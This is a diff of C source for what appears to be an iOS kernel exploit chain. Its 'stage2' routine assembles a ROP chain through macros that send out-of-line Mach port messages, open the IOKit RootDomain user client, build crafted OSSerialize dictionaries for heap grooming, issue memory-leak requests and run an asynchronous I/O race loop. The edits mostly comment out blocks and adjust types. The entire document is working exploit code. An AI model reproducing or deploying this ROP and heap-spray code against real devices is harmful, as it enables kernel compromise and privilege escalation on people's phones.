@@ -650,6 +650,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 
+	/*
 	struct __sigaction * myaction = malloc(sizeof(struct __sigaction));
 	memset(myaction,0,sizeof(struct __sigaction));
 	myaction->sa_handler = offsets->rop_nop-0x180000000+offsets->new_cache_addr;
@@ -659,7 +660,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("my_action",2);
 	CALL("__sigaction",SIGWINCH,0,0,0,0,0,0,0);
-
+*/
 	uint64_t * test_break_val = malloc(8);
 	*test_break_val = 0;
 	DEFINE_ROP_VAR("test_break_val",sizeof(uint64_t),test_break_val);
@@ -668,9 +669,11 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		ROP_VAR_ARG("test_string",2);
 		CALL("write",1,0,1024,0,0,0,0,0);
 		
-		ROP_VAR_ARG_HOW_MANY(1);
+		/*	
+	 	ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG64("reply_port",5); 
-		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0 /*recv port*/, 0, MACH_PORT_NULL,0);
+		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_MSG_TIMEOUT_NONE,0,0,0, 0, MACH_PORT_NULL,0);
+		*/
 
 		// set x0 to the_one
 		SET_X0_FROM_ROP_VAR("test_break_val");
@@ -690,6 +693,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("desc_addr",8,tmp); // pointer to the port buffer
 
 	ool_message_struct * ool_message = malloc(sizeof(ool_message_struct));
+	memset(ool_message,0,sizeof(ool_message_struct));
 	ool_message->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
     ool_message->head.msgh_local_port = MACH_PORT_NULL;
     ool_message->head.msgh_size = (unsigned int)sizeof(ool_message_struct) - 2048;
@@ -718,7 +722,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("service",sizeof(io_service_t),tmp); // RootDomain Service
 	DEFINE_ROP_VAR("client",sizeof(io_connect_t),tmp); // RootDomainUC
 
-	unsigned int raw_dict[] = {
+	uint32_t raw_dict[] = {
 		kOSSerializeMagic,
 		kOSSerializeEndCollection | kOSSerializeData | 0x10,
 		0xaaaaaaaa,
@@ -962,11 +966,13 @@ _STRUCT_ARM_THREAD_STATE64
 		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
 		SET_ROP_VAR32("tmp_port",0); // make sure tmp_port really is zero
 
+		/*
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("ool_msg",1);
 		CALL("mach_msg",0,MACH_SEND_MSG,ool_message->head.msgh_size,0,0,0,0,0);
 
 		// no need for another loop in rop... we can just unroll this one here
+		
 		ROP_VAR_CPY_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0,sizeof(mach_port_t)); // set memleak_msg->Head.msgh_request_port
 		for (int i = 0; i < 10; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
@@ -986,7 +992,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 		// copy the descriptor address into it's own var
 		ROP_VAR_ARG_HOW_MANY(2);
-		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2, offsetof(ool_message_struct,desc) + offsetof(mach_msg_ool_ports_descriptor_t, address) /*offset of .desc[0].address*/);
+		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2,offsetof(ool_message_struct,desc[0].address));
 		ROP_VAR_ARG("desc_addr",1);
 		CALL("memcpy",0,0,8,0,0,0,0,0);
 
@@ -1000,6 +1006,7 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_X0_FROM_ROP_VAR("the_one");
 		// break out of the loop if x0 is nonzero
 		ADD_LOOP_BREAK_IF_X0_NONZERO("main_loop");
+		*/
 
 	ADD_LOOP_END();
 
@@ -1250,6 +1257,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 	//the framework doesn't support inner loops atm, so I hope this works... fingers crossed
 	ADD_LOOP_START("racer_loop");
+
 		ROP_VAR_ARG_HOW_MANY(2);
 		ROP_VAR_ARG("aio_list",2);
 		ROP_VAR_ARG("sigevent",4);
@@ -1263,6 +1271,7 @@ _STRUCT_ARM_THREAD_STATE64
 		ROP_VAR_ARG("test_string",2);
 		CALL("write",1,0,1024,0,0,0,0,0);
 		*/
+		
 		for (int i = 0; i < NENT; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
 			ROP_VAR_ARG64_W_OFFSET("aio_list",1,i*8);
